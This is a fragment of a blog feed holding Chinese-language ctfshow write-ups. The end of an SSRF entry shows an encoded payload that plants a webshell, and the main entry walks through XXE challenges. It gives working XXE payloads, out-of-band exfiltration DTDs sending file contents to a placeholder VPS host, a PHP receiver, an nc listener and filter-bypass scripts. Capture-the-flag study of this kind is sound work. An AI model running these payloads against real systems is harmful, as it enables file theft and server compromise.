class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%34</span><span class="hljs-variable">%31</span><span class="hljs-variable">%30</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%64</span><span class="hljs-variable">%62</span><span class="hljs-variable">%66</span><span class="hljs-variable">%69</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%65</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%61</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%65</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%34</span><span class="hljs-variable">%39</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%73</span><span class="hljs-variable">%68</span><span class="hljs-variable">%65</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%70</span><span class="hljs-variable">%68</span><span class="hljs-variable">%70</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%41</span><span class="hljs-variable">%31</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%34</span><span class="hljs-variable">%34</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%73</span><span class="hljs-variable">%61</span><span class="hljs-variable">%76</span><span class="hljs-variable">%65</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><br></code></pre></td></tr></table></figure><p>发包，拿到webshell，直接读flag</p>]]></content>
      
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> ssrf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-xxe</title>
      <link href="/2025/03/19/ctfshow-xxe/"/>
      <url>/2025/03/19/ctfshow-xxe/</url>
      
        <content type="html"><![CDATA[<h1 id="ctfshow-xxe"><a href="#ctfshow-xxe" class="headerlink" title="ctfshow-xxe"></a>ctfshow-xxe</h1><h2 id="XXE基础知识"><a href="#XXE基础知识" class="headerlink" title="XXE基础知识"></a>XXE基础知识</h2><p>​        XXE（XML External Entity）攻击是一种针对XML处理漏洞的网络安全攻击手段。攻击者利用应用程序在解析XML输入时的漏洞，构造恶意的XML数据，进而实现各种恶意目的。</p><p>所以要学习xxe就需要了解xml</p><p>xml相关：<br>XML，全称为可扩展标记语言（Extensible Markup Language），是一种用于标记电子文件使其具有结构性的标记语言。它属于标准通用标记语言的子集，通过此种标记，计算机之间可以处理包含各种信息的数据，比如文章等。XML非常适合万维网传输，提供统一的方法来描述和交换独立于应用程序或供应商的结构化数据。它是Internet环境中跨平台的、依赖于内容的技术，也是当今处理分布式结构信息的有效工具。</p><p><strong>XML的特性和语法包括：</strong></p><p><strong>XML是大小写敏感的。</strong><br><strong>XML只有单个标签而没有相对应的结束标签的元素必须以“&#x2F;”结尾，否则结束标签绝对不能省略。</strong><br><strong>XML中的属性值必须使用引号，例如“width&#x3D;‘300’”，不能写成“width&#x3D;300”。</strong><br><strong>XML中所有的属性必须都有属性值。</strong><br><strong>XML文档应当以一个文档头开始，文档头可选，但是强烈建议使用。例如：“<?xml version='1.0’?>”或“<?xml version='1.0' encoding='UTF-8’?>”。</strong><br><strong>XML文档的正文包含根元素，根元素包含其他元素。元素可以有子元素、文本或者两者皆有。</strong><br><strong>XML文档由两部分构成：第一部分是文档序言，第二部分是文档元素（节点）。文档序言通常位于XML文档的顶端，根元素之前出现，它是一个特定的包含XML文档设定信息的部分。XML文档序言主要由XML声明、文档类型定义（DTD）和XML Schema组成。XML声明用来设置XML文档解析时所需的基本参数，包括版本号、编码方式等。DTD定义了文档的整体结构以及文档的语法，应用广泛并有丰富工具支持。XML Schema则用于定义管理信息等更强大、更丰富的特征。</strong></p><p>XML的用途非常广泛，主要包括：</p><p>存储数据：XML可以用于持久化保存需要长期存储的数据，例如web应用程序中的各种配置文件（如web.xml和bean.xml）。<br>分离数据：XML能将数据和展现形式相分离，使数据的组织者和展示者能更专注于各自的任务。<br>交换数据：XML可以在不兼容的系统之间交换数据，因为XML是纯文本格式，不受软件和硬件的限制。<br>共享数据：XML提供了一种简单的数据共享方式，因为任何应用程序都可以读取和解析XML文件。<br>总的来说，XML是一种强大且灵活的数据标记语言，它广泛应用于各种需要结构化数据处理的场景，特别是在Web开发、数据交换和配置文件管理等领域。</p><p>xml相似于html，但是它可以自定义标签</p><p>XML 和 HTML 为不同的目的而设计：</p><p>XML 被设计用来传输和存储数据，其焦点是数据的内容。<br>HTML 被设计用来显示数据，其焦点是数据的外观。<br>HTML 旨在显示信息，而 XML 旨在传输信息。</p><p>XXE:<br>       首先，攻击者会寻找那些存在XXE漏洞的应用程序作为攻击目标。这些应用程序可能没有正确限制或验证XML输入中的外部实体引用。</p><pre><code>一旦找到了目标，攻击者会开始构造恶意的XML输入。这通常涉及到在XML文档中定义外部实体，这些实体指向攻击者想要访问或控制的资源，如文件、URL或其他后端系统。然后，攻击者将这些恶意的XML输入发送给目标应用程序。当应用程序解析这些XML数据时，它会尝试加载并包含这些外部实体引用的内容。由于应用程序没有正确地限制或验证这些引用，它可能会执行攻击者指定的恶意操作。通过XXE攻击，攻击者可以实现多种恶意目的。例如，他们可以读取目标服务器上的敏感文件，如配置文件、密码文件或数据库凭据。这些文件通常包含有关应用程序配置、用户凭证或其他重要信息，对攻击者来说具有很高的价值。</code></pre><p>   此外，攻击者还可以利用XXE攻击发起服务器端请求伪造（SSRF）攻击，进一步探索和利用目标应用程序的内部网络结构。通过构造特定的XML输入，攻击者可以使应用程序发起对内部网络资源的请求，从而获取更多关于目标系统的信息。</p><p>  在某些情况下，攻击者甚至可以利用XXE漏洞执行远程代码。他们可以在XML输入中嵌入恶意代码，通过应用程序的XML解析器执行这些代码，进而实现对目标系统的完全控制。</p><p>  总的来说，从攻击者的角度来看，XXE攻击是一种利用应用程序对XML处理不当的漏洞，通过构造恶意的XML输入来实现各种恶意目的的攻击手段。为了防范XXE攻击，应用程序需要正确验证和限制XML输入中的外部实体引用，并采取其他必要的安全措施。</p><h2 id="web-373（有回显XXE读取文件数据）"><a href="#web-373（有回显XXE读取文件数据）" class="headerlink" title="web-373（有回显XXE读取文件数据）"></a>web-373（有回显XXE读取文件数据）</h2><p>先看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2021-01-07 12:59:52</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2021-01-07 13:36:47</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">false</span>);<br><span class="hljs-variable">$xmlfile</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$xmlfile</span>))&#123;<br>    <span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMDocument</span>();<span class="hljs-comment">//该对象用于操作xml数据</span><br>    <span class="hljs-variable">$dom</span>-&gt;<span class="hljs-title function_ invoke__">loadXML</span>(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<span class="hljs-comment">//加载 XML 文件并进行解析</span><br>    <span class="hljs-variable">$creds</span> = <span class="hljs-title function_ invoke__">simplexml_import_dom</span>(<span class="hljs-variable">$dom</span>);<span class="hljs-comment">//换了一种方式</span><br>    <span class="hljs-variable">$ctfshow</span> = <span class="hljs-variable">$creds</span>-&gt;ctfshow;<span class="hljs-comment">//将xmlctfshow标签里面的内容赋值个ctfshow这个变量</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$ctfshow</span>;<span class="hljs-comment">//输出这个值</span><br>&#125;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);    <br></code></pre></td></tr></table></figure><p>通过伪协议input获取post中的数据流 然后</p><p>libxml_disable_entity_loader(false);启用 libxml 实体加载器功能，允许 XML 解析器加载外部实体</p><p>LIBXML_NOENT 表示禁止实体扩展 xml自带实体比如&lt; &gt;不能使用 以及内部实体<br><code>LIBXML_DTDLOAD</code> 表示允许加载外部 DTD</p><p>并且有回显</p><p>所以bp抓包，然后构造payload</p><p>payload：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">payload</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">payload</span> <span class="hljs-keyword">ANY</span>&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">creds</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">ctfshow</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">ctfshow</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">creds</span>&gt;</span><br></code></pre></td></tr></table></figure><p>解释：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml">这段DTD定义了一个外部实体 xxe，它指向 /flag文件。<br><span class="hljs-symbol">&amp;xxe;</span>：在 ctfshow 元素中，引用了 xxe 外部实体。解析时，<span class="hljs-symbol">&amp;xxe;</span> 会被替换成 /flag 文件的内容（在Linux系统上）。<br>从而实现文件读取的作用<br></code></pre></td></tr></table></figure><p>提交之后就拿到flag了</p><p><img src="/../image/ctfshow-xxe-1.png"></p><hr><h2 id="web-374（无回显XXE外带数据）"><a href="#web-374（无回显XXE外带数据）" class="headerlink" title="web-374（无回显XXE外带数据）"></a>web-374（无回显XXE外带数据）</h2><p>首先看题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">false</span>);<br><span class="hljs-variable">$xmlfile</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$xmlfile</span>))&#123;<br>    <span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMDocument</span>();<br>    <span class="hljs-variable">$dom</span>-&gt;<span class="hljs-title function_ invoke__">loadXML</span>(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<br>&#125;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);    <br></code></pre></td></tr></table></figure><p>发现这题没有回显，所以使用外带数据通道提取数据</p><p>步骤：xml获取dtd dtd中放base64读取文件和带数据 </p><p><strong>第一种方式：</strong></p><p>payload：</p><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mojolicious"><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">test</span> [</span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=/flag&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">quote</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://vps_ip/xxe/test.dtd&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="language-xml"></span></span><span class="language-perl"><span class="hljs-variable">%quote</span>;</span><span class="language-xml"><span class="hljs-meta"></span></span><br><span class="hljs-meta"><span class="language-xml">]&gt;</span></span><br></code></pre></td></tr></table></figure><p>vps test.dtd</p><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mojolicious"><span class="language-xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">load</span> <span class="hljs-string">&quot;&lt;!ENTITY &amp;#x25; send  SYSTEM &#x27;http://vps_ip/xxe/index.php?file=%file;&#x27;&gt; &quot;</span>&gt;</span></span><br><span class="language-xml"></span><span class="language-perl"><span class="hljs-variable">%load</span>;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="language-perl"><span class="hljs-variable">%send</span>;</span><br></code></pre></td></tr></table></figure><p>vps index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]) ; <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>发送后会在vps下的test.txt中看到base64编码后的flag</p><p><img src="/../image/ctfshow-xxe-2.png"></p><hr><p><strong>第二种方式：</strong></p><p>payload：</p><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mojolicious"><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">convert</span> [ </span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">remote</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://vps_id/xxe/test.dtd&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="language-xml"></span></span><span class="language-perl"><span class="hljs-variable">%remote</span>;<span class="hljs-variable">%int</span>;<span class="hljs-variable">%send</span>;</span><span class="language-xml"><span class="hljs-meta"></span></span><br><span class="hljs-meta"><span class="language-xml">]&gt;</span></span><br></code></pre></td></tr></table></figure><p>vps test.dtd</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;</span>&gt;</span><br><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">int</span> <span class="hljs-string">&quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://vps_ip:9999?q=%file;&#x27;&gt;&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>vps上nc -lvv 进行监听端口9999</p><hr><h2 id="web-375（无回显XXE过滤XML声明绕过）"><a href="#web-375（无回显XXE过滤XML声明绕过）" class="headerlink" title="web-375（无回显XXE过滤XML声明绕过）"></a>web-375（无回显XXE过滤XML声明绕过）</h2><p>先看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2021-01-07 12:59:52</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2021-01-07 15:22:05</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">false</span>);<br><span class="hljs-variable">$xmlfile</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;/&#x27;</span>, <span class="hljs-variable">$xmlfile</span>))&#123;<span class="hljs-comment">//过滤了xml声明</span><br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$xmlfile</span>))&#123;<br>    <span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMDocument</span>();<br>    <span class="hljs-variable">$dom</span>-&gt;<span class="hljs-title function_ invoke__">loadXML</span>(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<br>&#125;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);    <br></code></pre></td></tr></table></figure><p>可以发现源码过滤掉了XML声明</p><p>这题解法和上题差不多。</p><p>几种绕过方法：</p><ol><li><strong>不写XML声明</strong></li><li><strong>在&lt;?xml后面多加个空格绕过</strong></li><li><strong>双引号换单引号</strong></li></ol><hr><h2 id="web-376（无回显XXE过滤XML声明绕过）"><a href="#web-376（无回显XXE过滤XML声明绕过）" class="headerlink" title="web-376（无回显XXE过滤XML声明绕过）"></a>web-376（无回显XXE过滤XML声明绕过）</h2><p>首先分析源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2021-01-07 12:59:52</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2021-01-07 15:23:51</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">false</span>);<br><span class="hljs-variable">$xmlfile</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;/i&#x27;</span>, <span class="hljs-variable">$xmlfile</span>))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$xmlfile</span>))&#123;<br>    <span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMDocument</span>();<br>    <span class="hljs-variable">$dom</span>-&gt;<span class="hljs-title function_ invoke__">loadXML</span>(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<br>&#125;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);    <br></code></pre></td></tr></table></figure><p><strong>比上一题多一个&#x2F;i大小写 没区别 同理</strong></p><hr><h2 id="web-377（无回显XXE过滤http和XML声明utf-16编码绕过）"><a href="#web-377（无回显XXE过滤http和XML声明utf-16编码绕过）" class="headerlink" title="web-377（无回显XXE过滤http和XML声明utf-16编码绕过）"></a>web-377（无回显XXE过滤http和XML声明utf-16编码绕过）</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2021-01-07 12:59:52</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2021-01-07 15:26:55</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">false</span>);<br><span class="hljs-variable">$xmlfile</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;|http/i&#x27;</span>, <span class="hljs-variable">$xmlfile</span>))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$xmlfile</span>))&#123;<br>    <span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMDocument</span>();<br>    <span class="hljs-variable">$dom</span>-&gt;<span class="hljs-title function_ invoke__">loadXML</span>(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<br>&#125;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);  <br></code></pre></td></tr></table></figure><p> 在 web374 的基础上过滤了 &lt;?xml version&#x3D;”1.0” 和 http</p><p>说是可以使用 UTF-16 编码绕过,</p><p>把web374的payload转为utf-16编码</p><p><strong>python脚本：</strong></p><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs mojolicious"><span class="language-xml">import requests</span><br><span class="language-xml">url = &#x27;http://0ec4fe9d-6949-4e9d-a3b1-70be3bb3f01b.challenge.ctf.show/&#x27;</span><br><span class="language-xml">payload = &#x27;&#x27;&#x27;</span><br><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">test</span> [</span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=/flag&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">quote</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://vps_ip/xxe/test.dtd&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="language-xml"></span></span><span class="language-perl"><span class="hljs-variable">%quote</span>;</span><span class="language-xml"><span class="hljs-meta"></span></span><br><span class="hljs-meta"><span class="language-xml">]&gt;</span></span><br><span class="language-xml">&#x27;&#x27;&#x27;</span><br><span class="language-xml">payload = payload.encode(&#x27;utf-16&#x27;)</span><br><span class="language-xml">rep = requests.post(url=url, data=payload)</span><br><span class="language-xml">print(rep.text)</span><br></code></pre></td></tr></table></figure><hr><h2 id="web-378（有回显XXE）"><a href="#web-378（有回显XXE）" class="headerlink" title="web-378（有回显XXE）"></a>web-378（有回显XXE）</h2><p>打开一看是个登录界面</p><p><img src="/../image/ctfshow-xxe-3.png"></p><p>抓个包看看</p><p><img 